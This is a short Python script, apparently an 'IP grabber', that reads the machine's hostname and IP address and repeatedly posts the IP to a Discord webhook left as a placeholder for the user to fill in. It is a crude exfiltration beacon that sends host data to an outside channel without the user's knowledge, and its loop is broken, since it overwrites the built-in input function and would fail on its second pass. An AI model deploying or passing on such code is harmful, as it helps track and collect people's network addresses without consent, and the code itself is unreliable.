import requests
import socket
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)   

payload_url= "YOUR DISCORD WEBHOOK TO SEND IP'S TO CHANNEL"
while True:
    message = input()
    input=(IPAddr)
    r =requests.post(payload_url, data={"content": IPAddr})
